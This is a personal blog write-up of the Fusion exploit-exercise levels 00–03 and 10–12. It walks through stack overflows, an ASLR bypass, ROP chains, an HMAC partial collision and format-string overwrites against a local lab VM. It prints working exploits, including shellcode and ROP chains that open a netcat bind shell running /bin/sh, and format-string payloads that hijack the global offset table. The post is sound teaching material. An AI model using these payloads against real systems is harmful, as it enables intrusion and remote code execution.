---

layout: post
title:  "Fusion Exploit Exercises: Part one"
author: jonatanhal

---

# Intro

Welcome back everyone. I'm excited to get to write about some new
stuff, these past protostar-challenges have been tricky & I've
certainly learned a lot about binary exploitation from them.

If you yourself is interested in picking up exploitation, I would
certainly recommend you to have a look at said challenges.

Experiencing first hand how bad code can be taken advantage of to
execute evil code, it sure as hell seems appropriate that technologies
that mitigate these bugs exist. I will try and bypass some of
these technologies in this post.

**Disclaimer**: I'm a noob. If you have any factual correction or
constructive criticism; please let me know by hitting me up on
[twitter](https://twitter.com/jonatanhal) or sending me a email
(jonatanhaltorp on gmail.)

* * * 

## [level00](https://exploit-exercises.com/fusion/level00/)

>This is a simple introduction to get you warmed up. The return
>address is supplied in case your memory needs a jog :)
>
>Hint: Storing your shellcode inside of the fix_path ‘resolved’ buffer
>might be a bad idea due to character restrictions due to
>realpath(). Instead, there is plenty of room after the HTTP/1.1 that
>you can use that will be ideal (and much larger).

Listening on port 20000 is `/opt/fusion/bin/level00`, a executable inwhich
we will try to find a stack-based bufferoverflow.

~~~
$ python -c "print 'GET foo HTTP/1.1'" | nc 127.0.0.1 20000
trying to access foo
~~~

Nothing special here, move along citizen.

### Crashing the process - 'A'*(>136)

{% highlight c %}

int fix_path(char *path)
{
  char resolved[128];
  
  if(realpath(path, resolved) == NULL) return 1; // can't access path. will error trying to open
  strcpy(path, resolved);
}

{% endhighlight %}

Here's a path, oh it's longer than 128 bytes. **STRCPY NOOOOOO...**

![Crash]({{ site-url }}/assets/post_images/fusion_level00_Acrash.gif)

#### Crashing the process - realpath link-resolution

`realpath` will resolve links, `../../` paths and other miscellaneous ways
of referring to a path into a absolute path.

If we create a file with a very very long filename and create a link
to that file, realpath will resolve the link. The program will then
copy the path into `resolved`, and overflow it.

~~~
$ touch `python "print 'A'*192"`
$ ln -s AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ./l00l
$ python -c "print 'GET /home/fusion/l00l HTTP/1.1'" | nc 127.0.0.1 20000
~~~

#### Crashing the process - 'A'*137

Alternatively we can just send all the `A`s.

~~~
$ python -c "print 'GET ' + 'A'*137 + ' HTTP/1.1'" | nc 127.0.0.1 20000
[debug] buffer is at 0xbffff8f8 :-)
$ dmesg | tail -n 1
[12027.104103] level00[3176]: segfault at bf004135 ip 08049975 sp bffff8e0 error 4 in level00[8048000+3000]
~~~

### Control over program counter

~~~
$ python -c "print 'GET '+'A'*139+'\xef\xbe\xad\xde'+' HTTP/1.1'" | nc 127.0.0.1 20000
[debug] buffer is at 0xbffff8f8 :-)
$ dmesg | tail -n 1
[12416.936119] level00[3221]: segfault at deadbeef ip deadbeef sp bffff8e0 error 15
~~~

Let's whip up some python to get this show on the road.

We're gonna need some shellcode, I found the one I used below
[here](https://www.exploit-db.com/exploits/37359/).

{% highlight python %}
# File: fusion00_solution.py
from struct import pack

NOPSLED="\x90"*12
SHELLCODE="\x31\xc0\x50\x68\x6e\x2f\x6e\x63\x68\x2f\x2f\x62\x69\x89\xe3\x50\x68\x35\x35\x35"+\
    "\x35\x68\x2d\x6c\x74\x70\x89\xe1\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x68"+\
    "\x2d\x65\x2f\x2f\x89\xe2\x50\x52\x51\x53\x89\xe7\xb0\x0b\x89\xf9\x31\xd2\xcd\x80"
OVERFLOW="A"*139
ADDR=pack('L', 0xbffff8f8+len(OVERFLOW)+20)
PAYLOAD="GET "+OVERFLOW+ADDR+" HTTP/1.1" + NOPSLED+SHELLCODE

print PAYLOAD
{% endhighlight %}

The shellcode listed above will open up netcat which will begin listening on port 5555
and accept commands from us.

~~~
$ # On fusion guest:
$ python fusion00_solution.py | nc 127.0.0.1 20000
< On another terminal >
$ nc 127.0.0.1 5555
id
uid=20000	gid=20000	groups=20000
~~~

![Crash]({{ site-url }}/assets/post_images/fusion_level00_success.jpg)

* * * 

## [level01](https://exploit-exercises.com/fusion/level01/)

>level00 with stack/heap/mmap aslr, without info leak :)

Neat! Same vulnerability as in the previous level, which is good
because we can reuse our previous solution as a way to get some
hands-on experience on attacking ASLR.

~~~
$ python level00_solution.py | nc 127.0.0.1 20001
$ dmesg | tail -n 1
[74573.771758] level01[8217]: segfault at bffff997 ip bffff997 sp bfb22800 error 14
~~~

Note that the stackpointer at the point of crashing is set to
0xbfb22800, and this address does not seem to change across different
tries. Cool, I wonder why that is.

A .txt describing PaX's ASLR-implementation (found
[here](http://pax.grsecurity.net/docs/aslr.txt)) 

>In practice brute forcing can be applied to bugs that are
>in network daemons that fork() on each connection since fork() preserves
>the randomized layout, as opposed to execve() which replaces it with a new
>one.

It turns out that `serve_forever` uses fork. Which would explain 
the non-changing, but still randomized stack-address.

Creating a crash on the previous level would allow us to observe
the offsets between the buffer and the stack-pointer at the point
of crash.

And the offsets should be the same, I mean - It's not called offset
layout randomization.

Note however that we would need to adjust the address after any reboot
or when level01 executable restarts.

~~~
prevAddr=0xbffff8f8
prevSP=0xbffff8e0
offset=prevAddr-prevSP

randSP=0xbfb22800
randAddr=randSP+offset
~~~

{% highlight python %}
# File: level01_solution.py
from struct import pack

NOPSLED="\x90"*12
SHELLCODE="\x31\xc0\x50\x68\x6e\x2f\x6e\x63\x68\x2f\x2f\x62\x69\x89\xe3\x50\x68\x35\x35\x35"+\
    "\x35\x68\x2d\x6c\x74\x70\x89\xe1\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x68"+\
    "\x2d\x65\x2f\x2f\x89\xe2\x50\x52\x51\x53\x89\xe7\xb0\x0b\x89\xf9\x31\xd2\xcd\x80"
OVERFLOW="A"*139
ADDR=pack('L', 0xbfb22818+len(OVERFLOW)+20)
PAYLOAD="GET "+OVERFLOW+ADDR+" HTTP/1.1" + NOPSLED+SHELLCODE

print PAYLOAD
{% endhighlight %}

### Testing our solution.

~~~
$ python level01_solution.py | nc 127.0.0.1 20001
< on another terminal >
$ nc 127.0.0.1 5555
id
uid=20001	gid=20001	groups=20001
~~~

![Success]({{ site-url }}/assets/post_images/fusion_level01_success.jpg)

* * * 

## [level02](https://exploit-exercises.com/fusion/level02/)

>This level deals with some basic obfuscation / math stuff.
>
>This level introduces non-executable memory and return into libc /
>.text / return orientated programming (ROP).

The buffer we send will be encrypted, and it will be encrypted via a
single xor operation, with a key thats generated when connecting to
the serving application.

We can abuse the fact that the encryption is a single xor, if we send
a already encrypted buffer back to the application; the buffer will be
decrypted (since `message xor key = cipher`, and `cipher xor key =
message`.)

The keybuf and keyed variables are declared as static, meaning that
they are initialized once, they won't change in the middle of our 
connection.

First things first, let's break some stuff.

### Crashing the application

{% highlight python %}
from struct import pack

LEN=0x20000+0xf

PAYLOAD='E'+pack('I', LEN)+'\xcc'*LEN+'Q'

print PAYLOAD
{% endhighlight %}

**Note: We have to send 'Q' to the application, or else it will exit
without returning using the saved return-address**

We can get the key the program uses by sending 128 nullbytes & saving
the returned key, (key xor 0 = key.)

Once we have the key, if we have a equivalent encryption-algorithm on
our side, we can produce and send data that will be decrypted as a
payload. 

### Control over EIP!

{% highlight python %}
# -*- coding: utf-8 -*-
import socket, time
from struct import pack, unpack

OVERFLOW=0x14
OLEN=0x20000+OVERFLOW
LEN=128
ADDR=pack('I',0xdeadbeef)
PAYLOAD='E'+pack('I', LEN)+"\x00"*LEN
KEYBUF=[]

def cipher(message, length):
    global KEYBUF
    cipherd = []
    for i in xrange(0, length, 4):
        cipherd.append(unpack('I', message[i:i+4])[0]^KEYBUF[(i/4)%32])
    return cipherd

def main():
    global OLEN, LEN, PAYLOAD, ADDR, KEYBUF
    s = socket.create_connection(("127.0.0.1", 20002))
    s.sendall(PAYLOAD)

    # flush some garbage down the toiler (177 ascii + 4 size)
    s.recv(181, socket.MSG_WAITALL)

    key=s.recv(128, socket.MSG_WAITALL)
    KEYBUF=[unpack('I',key[i:i+4])[0] for i in range(0, 128, 4)]

    # Create a ciphered block of payload
    ENCRYPTED_PAYLOAD='E'+pack('I', OLEN)
    part=''.join(pack('I', x) for x in cipher(ADDR*32, len(ADDR*32)))
    ENCRYPTED_PAYLOAD+=part*1024+part[:OVERFLOW]

    s.sendall(ENCRYPTED_PAYLOAD+"Q")
    s.close()

if __name__ == "__main__":
    main()
{% endhighlight %}

~~~
$ dmesg | tail -n 1
... level02[23974]: segfault at deadbeef ip deadbeef sp bfc5fde0 error 15
~~~

That was reasonable enough, but I'm now rapidly approaching unknown
territory (return oriented programming.) Well, thankfully the fusion-VM
comes preinstalled with ROPgadget, which undoubtedly will help me
in finding the rop-gadgets I'm looking for.

But what *am* I looking for exactly?

Word on the street is that one way to achieve code-execution, is to
create a fake stack-frame, which can be used when calling a function.

### Timetravel into execve

I return with good news. After experimenting with some ways of writing
into memory, and experimenting with different chains; I was able to
execute netcat.

I started out by returning into nread, which reads from my connection
& stores n-amount of recieved bytes in a piece of writable memory.

{% highlight python %}
chain=[
    0x804952d, # &nread
    0x8048815, # add esp, 8; pop ebx; ret
    1,         # nread(1,
    0x804b464, #       &buffer,
    20,        #       size)
{% endhighlight %}

I added the `0x8048815`-gadget to advance the stack-pointer past the
arguments provided to nread.

Upon returning from the gadget, I (again) returned into nread to store some
addresses at `0x804b42c`, I will use this as `argv` parameter when calling
execve.

And again, I added the `0x8048815`-gadget to advance the stack-pointer :)

{% highlight python %}
    # continuing the chain
    0x804952d, # &nread
    0x8048815, # add esp, 8; pop ebx; ret
    1,         # nread(1,
    0x804b42c, #       &buffer,
    8,         #       size)
    0x80489b0, # &(execve@plt)
    JUNK,
    0x804b470, # &"/bin/nc"
    0x804b42c, # &argv
    0
]
{% endhighlight %}

nread will read from the connection and shove any byte i send it into
the locations specified. These locations do not change when restarting 
the program, which comes in handy.

~~~
time.sleep(0.5)
s.sendall('/bin/sh\x00-le\x00/bin/nc\x00') 
time.sleep(0.5)
s.sendall(pack('I', 0x804b46c)+pack('I',0x804b464))
~~~

At this point, we are able to execute `nc -le /bin/sh`, buuuut... Theres something
not quite right.

We can see what's going wrong if we attach to the process with
**strace** (specifying `-f` to follow forking, telling strace what pid
to attach to via `-p` & `-s` to let strace know that it should print
strings up to a length of 64.)

~~~
root@fusion:~# strace -p 1492 -f -s 64
...
[pid  6692] write(2, "/bin/sh: forward host lookup failed: ", 37) = 37
[pid  6692] write(2, "Unknown host", 12) = 12
[pid  6692] write(2, "\n", 1)           = 1
[pid  6692] close(-1)                   = -1 EBADF (Bad file descriptor)
[pid  6692] exit_group(1)               = ?

:(
~~~

Why is this happening?

We can reproduce the error message if we run `nc /bin/sh`

Seems like the `-le` parameter is getting lost somewhere :)
 
This is probably because normally, a program would be given argv with
`/path/to/program` as argv[0], in our case argv[0] is 
`-le`, which might screw things up. I'm not sure though.

We correct our simple error by prepending the address of
the string `/bin/nc` in our own argv and just like that, we're in.

~~~
$ python level02_solution.py
$ netstat -l
...
tcp		0		0 *:34551		*:*			LISTEN
...
$ nc 127.0.0.1 34551
id
uid=20002 gid=20002 groups=20002
~~~

![Success]({{ site-url }}/assets/post_images/fusion_level02_success.gif)

Listed below is the exploit I wrote in python. It's not very neat and
organized, but it works.

{% highlight python %}
# -*- coding: utf-8 -*-
import socket, time
from struct import pack, unpack

JUNK=0xdeadbabe
OVERFLOW=0x10
OLEN=0x20000+OVERFLOW
LEN=128
foo=[
    0x804952d, # &nread
    0x8048815, # add esp, 8; pop ebx; ret
    1,         # nread(1,
    0x804b464, #       &buffer,
    20,        #       size)
    0x804952d, # &nread
    0x8048815, # add esp, 8; pop ebx; ret
    1,         # nread(1,
    0x804b42c, #       &buffer,
    13,        #       size)
    0x80489b0, # &(execve@plt)
    JUNK,
    0x804b471, # &"/bin/nc"
    0x804b42d, # &argv
    0          # no envp    
]
CHAIN=''.join(pack('I', l) for l in foo)
PAYLOAD='E'+pack('I', LEN)+"\x00"*LEN
KEYBUF=[]

def cipher(message, length):
    global KEYBUF
    cipherd = []
    for i in xrange(0, length, 4):
        cipherd.append(unpack('I', message[i:i+4])[0]^KEYBUF[(i/4)%32])
    return cipherd

def main():
    global OLEN, LEN, PAYLOAD, KEYBUF, CHAIN

    # Create connection & Send initial payload ;)
    s = socket.create_connection(("127.0.0.1", 20002))
    s.sendall(PAYLOAD)

    # Flush some garbage down the toiler (177 ascii + 4 size)
    s.recv(181, socket.MSG_WAITALL)

    # retrieve the key, hashtag 1337cr4ck3r
    key=s.recv(128, socket.MSG_WAITALL)
    KEYBUF=[unpack('I',key[i:i+4])[0] for i in xrange(0, 128, 4)]

    # Create a ciphered block of payload
    payload='A'*(OLEN)+CHAIN
    ENCRYPTED_PAYLOAD='E'+pack('I', OLEN+len(CHAIN))
    ENCRYPTED_PAYLOAD+=''.join(pack('I', x) for x in cipher(payload, len(payload))) # <- EZ

    # Vamos ala explotar!
    s.sendall(ENCRYPTED_PAYLOAD+"Q")
    time.sleep(0.5) # Wait for our payload to process
    # send some strings with relevant binaries and arguments
    s.sendall('/bin/sh\x00-lne\x00/bin/nc\x00') 
    time.sleep(0.5) # Cool people are late to the party
	# send argv pointers
    s.sendall(pack('I', 0x804b471)+pack('I', 0x804b46c)+pack('I',0x804b464))
    # All is well, Sayonara.
    s.close()
    return 0

exit(main())
{% endhighlight %}

### Phew!

Solving this level was a lot of fun; frustrating at times (when
arriving at a dead end.) If I had a femtiolapp for every failiure or
bad idea - ooh boy.

Let's continue on our quest towards non-scriptkiddieness.

* * * 

## [level03](https://exploit-exercises.com/fusion/level03/)

> About
>
>This level introduces partial hash collisions (hashcash) and
>more stack corruption

We're being sent a token, which also happends to be used as a key in
the HMAC function-call. The size of the token itself is 60 bytes. 

Note that according to wikipedias article on HMAC, when using SHA-1 as
hash, the key is padded with zero-bytes if the key size is less than
64 bytes.

the HMAC function called in the `validate_request` function

It turns out that finding a hash-collision in the space of two bytes
(2^16) is rather simple (in regards of time it takes to find one).

The `validate_request` function does not seem vulnerable to a
stack-based buffer overflow, it's just a hoop we have to jump through
while getting our exploit to work.

## Houston, we got a POST-request.

It's a wierd feeling, hacking on some exploit code and trying
everything and, all of a sudden; things work.

Using some code I wrote in C, I had a server listening for
HTTP-connections on my Host machine when I ran my exploit. What I saw,
for the first time was not only some logging from the command `sudo
python -m http.server 80`, but a glimmer of progress.

![Progress!]({{ site-url }}/assets/post_images/fusion_level03_progress.png)

We're recieving a token, which is used as a key when calling the HMAC
function, we're building some JSON in the `input.json` file. I wrote
some code that calls HMAC and performs the equivalent check in
`validate_request` (`invalid = result[0] | result[1]; if (invalid)
{..`)

Here, have some code.

{% highlight c %}
while(1) {
	// Operator, please connect me to HMAC
	HMAC(EVP_sha1(),
	     token, strlen(token),
	     buffer, strlen(buffer),
	     result, &resultSize);
	invalid = result[0] | result[1];
	if (invalid) {
		// modify buffer and repeat
		sprintf(pointer, "\n//%08x", incrementing);
		incrementing++;
		continue;
	} else {
		printf("[!] Collision checksum: %02x%02x%02x%02x\n",
		       result[0], result[1], result[2], result[3]);
		break;
	}
}
{% endhighlight %}

While the check fails, there's a incrementing variable that is written to
modify the contents of the buffer we're sending.

And, when the else-condition kicks in, the two byte hash-collision
has been detected; And we can celebrate, as our (signed?) payload is traveling
across the wires and into the target.

# Cool story bruh, but where's all the SIGSEGV's?

Oh, you want a SIGSEGV huh?

I'll give you a SIGSEGV.

The program will crash if we send `"tags":-1`, or the following semi-sensical json.

{% highlight python %}
payload="""{'title':'dickhead','contents': 'Hello world!','serverip': '192.168.14.51',
"""+','.join("'tags':"+"'"+hex(i)[2:]+"'" for i in range(32))+"}"
{% endhighlight %}

The `tags` variable can hold up to 16 tags, but giving the program 32
tags is bad news, some of the the details surrounding the sigsegv is
logged in dmesg.

~~~
fusion@fusion:~$ dmesg | tail -n 1
level03[6397]: segfault at 20 ip 08049d3f sp bff41ad0 error 4 in level03[8048000+3000]
~~~

### You didn't even get control over EIP, wtf?

Let's fix that. 

The `decode_string` function will write beyond the length of a buffer
if the "ending" character (`buffer[len]`), is `\\u`.

When the last character in the buffer is a backslash, the check that
is used in the function will let us continue to spray things into the buffer.

{% highlight c %}
while(*src && dest != end) {
    // do stuff
}
{% endhighlight %}

Even though end is destination+length, we increment destination twice
while unescaping the `\u`-thing. 

This might very well be false, but it makes some sense in my mind :D.

The `title` buffer is located 160 bytes before the saved
return-address of `handle_request`.

With some basic math and some keypresses in our favourite editor,
we cook up some code to do our bidding.

Up until now, I've programmed my exploits using python, which has
been nice and relaxing; not having to deal with the nitty gritty
side of things. I chose to write my exploit in C this time around.

## Reading exploit-code is boring, here are the basics

Basically, we're receiving a token from the application. Upon
incorporating the token into the json-payload we're sending, a
authentication-code is generated. If the leading two bytes of the
authentication-code are zeroes, the check in `validate_request` will
allow us to progress.

The json-payload we are generating will contain a title &
contents-object. The title object contains 127 hex 41 bytes, followed
by two backslashes. The data beyond this point is padding (31 bytes)
used to overflow the stack, and finally, we have the saved
return-address.

We will use Return-oriented programming again to achieve code
execution, much like we did in the previous challenge.

# Times are tough, not enough functions to go around

In the previous level, we achieved execution by using nread to writing
some strings into memory and using those pieces of memory when calling
`execve` to run our program of choice.

We don't have that convenience now, we need to jump through some hoops
:)

Using the chain listed below, I am able to add `0x10101010` to memory,
`0x20202020` in this case.

{% highlight c %}
0x08049b4f               // pop eax; add esp, 0x5c; ret
0x10101010               // Arbitrary dword to add to [ebx]
// 0x5c bytes of padding
0x08049402               // pop ebx; pop ebp; ret
0x02020202 - 0x5d5b04c4; // Arbitrary address to modify the contents of
// 4 bytes of padding
0x080493fe               // add dword ptr [ebx + 0x5d5b04c4], eax; ret;
0xdeadbeef               // next address to return to
...
{% endhighlight %}

Now that we basically write to memory, our next goal will be to craft
a chain that will enable us to execute what we want.

There is no execve directly available to us via the linking-table. The
memory-layout is randomized (the offsets however, are not.) If we can
take the location of a shared library function and adjust that
address, we could possibly end up where we want to be :)

The address of execve is randomized at program startup, all we need to
do is to use a pointer at the linking-table, increment that pointer
with a offset we know, to make it point to execve.

I used `nm -Dv /lib/i386-linux-gnu/libc.so.6` (`-v` to sort by address
rather than by function name) and searched for execve, scrolled up
until I saw a function name which is present in the level03 plt and
proceeded to calculate and verify the offset using gdb.

~~~
$ nm -Dv /lib/i386-linux-gnu/libc.so.6`
...
0009b5c0 W fork
...
0009b910 W execve
...
(gdb) x/x fork+0x350 # 0x9b910-0x9b5c0 = 0x350
0xb7470910 <__execve>: ...
~~~

So if we increment fork@plt with 0x350, it's no longer pointing to 
fork, but to execve! Neat!

There's a two gadgets that will help us in completing this task.

* `0x8049207: pop ebp; ret;`

* `0x804a166: inc dword ptr [ebp + 0x16a7ec0]; ret`

If we pop the address of fork@plt (minus `0x16a7ec0`) into ebp, and then proceed to 
call the second gadget 0x350 times, we've made fork@plt point 
to execve! Yay!

Now that we can A) write arbitrary data into zeroed, writable memory,
and B) increment the function-pointers located in the plt; we're golden.

I chose to execute `/bin/nc -le /bin/sh` for a remote shell.

![Success!]({{ site-url }}/assets/post_images/fusion_level03_success.png)

![Success!]({{ site-url }}/assets/post_images/fusion_level03_celebration.gif)

You can read the exploit I wrote [here]({{ site-url }}/assets/fusion_level03_solution.c)

## Less python, more C

As I've written previously; so far I have used python when solving the
challenges. I am pretty comfortable with python, so it's not a hard choice.

This time however, I felt that it would be a interesting experience
writing a exploit in C, and while my skills in writing C are
fundamental at best, they are what they are. Writing the exploit in C,
I could basically copy the `validate_request` functions critical
points and apply them to my exploit.

Shoutouts to vulnerable code.

### Tools & Tips

* Don't give up, never surrender!

* Keep it simple, stupid!

  I have wasted a lot of hours trying different ways of getting
  fork to point to execve, It was only when I decided to go with 
  a more simple approach (increment by 1, 0x350 times) that I succeeded.

* I used ropper 1.7.3 to find the different ROP-gadgets.

* Using radare2, inspecting the permissions on locations in memory can
  be done via the `ai ADDR` command.

* * *

## Hold my keyboard while I suplex these binaries

Now, let us take a brief detour from these stack-based buffer
overflows and sink our teeth into formatting exploits. The levels are
getting pretty advanced, and to keep spirits high, I would like to
brush off the "easier" levels before getting stuck on the more
difficult ones :)

# [level10](https://exploit-exercises.com/fusion/level10/)

> About 
>
> Introductory format string level that covers basic expansion.

The level10 binary is listening on port 20010.

We're able to overflow the `output` buffer if we request a very large
format-padding.

~~~
$ nc 127.0.0.1 20010
%1024dAaAa

[ target contains 0x61416141, wanted 0xdea110c8 ]
~~~

And we can thus, modify the value.

~~~
$ python -c "print '%1024d'+'\xc8\x10\xa1\xde'" | nc 127.0.0.1 20010

[ critical hit! :> ]
~~~

![Success!]({{ site-url }}/assets/post_images/fusion_level10_celebration.gif)

* * * 

# [level11](https://exploit-exercises.com/fusion/level11/)

>About
>
>Another warm up level that covers writing arbitrary values to memory.

This time, we're gonna overwrite a global integer, located in the .bss
section.

Using the `%n` formatter, printf will write the number of bytes written
to the string so far into a dereferenced pointer located on the stack. 

Examining the stack in gdb right before the call to printf, we can see
that our input-buffer is the fourth dword from the top of the stack.

~~~
(gdb) break *expand_the_input+110
Breakpoint 1 at 0x804994e: file level11/level11.c, line 15.
(gdb) c
Continuing.
[New process 17095]
[Switching to process 17095]

Breakpoint 1, 0x0804994e in expand_the_input () at level11/level11.c:15
15	level11/level11.c: No such file or directory.
	in level11/level11.c
   0x08049945 <expand_the_input+101>:	8d 85 f8 fe ff ff	lea    eax,[ebp-0x108]
   0x0804994b <expand_the_input+107>:	89 04 24	mov    DWORD PTR [esp],eax
=> 0x0804994e <expand_the_input+110>:	e8 7d ef ff ff	call   0x80488d0 <printf@plt>
(gdb) x/8x $esp
0xbfd282d0:	0xbfd282e0	0x000000ff	0xb78495a0	0xb7863979
0xbfd282e0:	0x41414141	0x42424242	0x43434343	0x0000000a
~~~

By continously padding out and writing to the different bytes of
`target`, we're able to modify it to `0x0ddba11`.

{% highlight python %}
import struct

pack = lambda dword: struct.pack("I", dword)

payload = ''.join([
    pack(0x804b4ec),
    pack(0x804b4ec+1),
    pack(0x804b4ec+2),
    pack(0x804b4ec+3), # 10 bytes written at this point
    "_", # 11
    "%4$n", 
    "A"*(0xba-0x11),
    "%5$n",
    "B"*(0xdd-0xba),
    "%6$n"
])

print payload

{% endhighlight %}

~~~
fusion@fusion:~$ python level11.py | nc 127.0.0.1 20011
[ &target = 0x0804b4ec, we want 0x0ddba11, currently is 0x0 ]
_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

[ critical hit! :> ]
~~~

![Success!]({{ site-url }}/assets/post_images/fusion_level11_celebration.gif)

* * * 

# [level12](https://exploit-exercises.com/fusion/level12/)

> About
>
>There is no description available for this level. Investigate
>the source code and see what you can find out!

The code below is vulnerable to a format-attack, where we use a
combination of `%n` and padding to write what we want, wherever we want.
  
{% highlight c %}
/*
 * The aim of this level is to redirect code execution by overwriting an entry
 * in the global offset table.
 */

void callme()
{
  printf("Hmmm, how did this happen?\n");
  system("exec /bin/sh");
}

void echo(char *string)
{
  printf("You said, \"");
  printf(string);
  printf("\"\n");
  fflush(stdout);
}
{% endhighlight %}

First I examined the stack just before the call to the second printf
in `echo`, looking for the buffer and taking note on its position.
This time it's a bit further ahead than the previous level, makes
sense since the buffer is local to another function.

Our buffer is the 14th dword from the top of the stack.

~~~
(gdb) x/16x $esp
0xbfc95530:	0x08049fc8	0x00000001	0xbfc95568	0xbfc95568
0xbfc95540:	0xbfc95569	0xbfc95968	0xbfc95988	0x08049acf
0xbfc95550:	0xbfc95568	0x0000000a	0xb76f65a0	0x00177d7c
0xbfc95560:	0x00177d7c	0x000000f0	0x41414141	0x42424242
~~~

We can confirm this by writing `AAAA%14$n`, and watch as the program
crashes.

~~~
Program received signal SIGSEGV, Segmentation fault.
0xb75c0f00 in _IO_vfprintf_internal (s=Cannot access memory at address 0x0)
...
(gdb) x/i $eip
=> 0xb75c0f00 <_IO_vfprintf_internal+11728>:	mov    %edx,(%eax)
(gdb) i r edx eax
edx            0x4	4
eax            0x41414141	1094795585
~~~

Now that we know how to write stuff, we should briefly cover what to
write where.

Our goal here is to redirect execution into `callme` (located @
`0x8049940`)

It's possible for us to call the exit function if we send the string
quit, and if we overwrite the address that points to exit
(`0x804b456c`) with the address of `callme`, we're done.

We put all the pieces together in a small exploit, at the end of the
exploits are some commands to send into our given shell.

{% highlight python %}
from time import sleep
import struct

pack = lambda dword: struct.pack("I", dword)

payload = ''.join([
    pack(0x804b56c),
    pack(0x804b56c+1),
    pack(0x804b56c+2),
    pack(0x804b56c+3),
    "A"*(0x40-0x10),
    "%14$n", 
    "B"*(0x99-0x40),
    "%15$n",
    "C"*(0x104-0x99),
    "%16$n",
    "D"*(0x108-0x104),
    "%17$n"
])

print payload

sleep(1)

print('quit')
print('id ; exit')
{% endhighlight %}

Upon running the exploit, we can confirm that it actually works!

~~~
fusion@fusion:~$ python level12.py | nc 127.0.0.1 20012
Basic echo server. Type 'quit' to exit
You said, "lmnoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCDDDD"
Hmmm, how did this happen?
uid=20012 gid=20012 groups=20012
You said, "quit"
~~~

![Success!]({{ site-url }}/assets/post_images/fusion_level12_celebration.gif)

* * * 

**I'll be back**
